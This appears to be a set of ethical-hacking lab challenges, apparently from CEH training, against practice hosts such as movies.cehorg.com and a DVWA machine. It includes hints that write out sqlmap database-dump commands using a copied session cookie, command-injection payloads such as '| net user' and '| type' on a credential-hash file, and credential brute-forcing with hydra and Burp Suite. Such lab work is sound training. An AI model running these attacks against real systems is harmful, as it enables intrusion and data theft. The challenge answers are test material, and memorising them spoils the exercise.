# Part III

## Challenge 1

CEHORG suspects of a possible session hijacking attack on a machine in its network. The organisation has retained the network traffic data for the session at C:\Users\Admin\Documents in the EH Workstation – 2 as sniffsession.pcap. You have been assigned a task to perform an analysis and find out the protocol that has been used for sniffing on its network. (Format: AAA)

__hint:__ wireshark

## Challenge 2

You have been assigned a task to perform a clickjacking test on www.certifiedhacker.com that the CEHORG members widely use. Find out whether the site is vulnerable to clickjacking. (Format: Aaa)

__hint:__ ClickjackPoc

## Challenge 3

Perform an HTTP-recon on www.certifiedhacker.com and find out the version of Nginx used by the web server. (Format: N.NN.N)

__hint:__ (Windows 11) httprecon

## Challenge 4

An FTP site is hosted on a machine in the CEHORG network. Crack the FTP credentials, obtain the “flag.txt” file and determine the content in the file. (Format: Aaaaaaa*AAA)

__hint:__ hydra

## Challenge 5

Perform Banner grabbing on the web application movies.cehorg.com and find out the ETag of the respective target machine. (Format: "NaNNNNNaaaNaaNN*N")

__hint:__

1. nc -vv movies.cehorg.com 80
2. GET / HTTP/1.0 (ENTER * 2)

## Challenge 6

Identify the Content Management System used by www.cehorg.com. (Format: AaaaAaaaa)

__hint:__ whatweb

## Challenge 7

Perform web application reconnaissance on movies.cehorg.com and find out the HTTP server used by the web application. (Format: Aaaaaaaaa-AAA/NN.N)

__hint:__ what web

## Challenge 8

Perform Web Crawling on the web application movies.cehorg.com and identify the number of live png files in images folder. (Format: N)

__hint:__ OWASP ZAP

## Challenge 9

Identify the load balancing service used by eccouncil.org. (Format: aaaaaaaaaa)

__hint:__ lbd

## Challenge 10

Perform a bruteforce attack on www.cehorg.com and find the password of user adam. (Format: aaaaaaNNNN)

__hint:__ Burp Suite

## Challenge 11

Perform parameter tampering on movies.cehorg.com and find out the user for id 1003. (Format: Aaaaa)

__hint:__ Burp Suite. Use Jason/welcome as login credentials

## Challenge 12

Perform a SQL Injection attack on movies.cehorg.com and find out the number of users available in the database. Use Jason/welcome as login credentials. (Format: N)

__hint:__

1. login use Jason/welcome
2. View Profile
3. Right Click > Inspect Element > Console
4. document.cookie
5. copy message
6. sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="[the copied message]" --dbs
7. sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="[the copied message]" -D moviescope --tables
8. sqlmap -u "http://movies.cehorg.com/viewprofile.aspx?id=1" --cookie="[the copied message]" -D moviescope -T User_Login --dump

## Challenge 13

Perform XSS vulnerability test on www.cehorg.com and identify whether the application is vulnerable to attack or not. (Yes/No). (Format: Aa)

__hint:__ python3 pwnxss.py -u http://www.cehorg.com

## Challenge 14

Perform command injection attack on 10.10.10.25 and find out how many user accounts are registered with the machine. Note: Exclude admin/Guest user (Format: N)

__hint:__

1. 10.10.10.25:8080/dvwa/
2. login as admin / password
3. set security level to low
4. command injecion
5. | net user

## Challenge 15

A file named Hash.txt has been uploaded through DVWA (http://10.10.10.25:8080/DVWA). The file is located in the directory mentioned below. Access the file and crack the MD5 hash to reveal the original message; enter the content after cracking the hash. You can log into the DVWA using the following credentials. Note: Username- admin; Password- password Path: C:\wamp64\www\DVWA\hackable\uploads\Hash.txt Hint: Use “type” command to view the file. Use the following link to decrypt the hash- https://hashes.com/en/decrypt/hash (Format: Aa*aaNa)

__hint:__

1. 10.10.10.25:8080/dvwa/
2. | type C:\wamp64\www\DVWA\hackable\uploads\Hash.txt
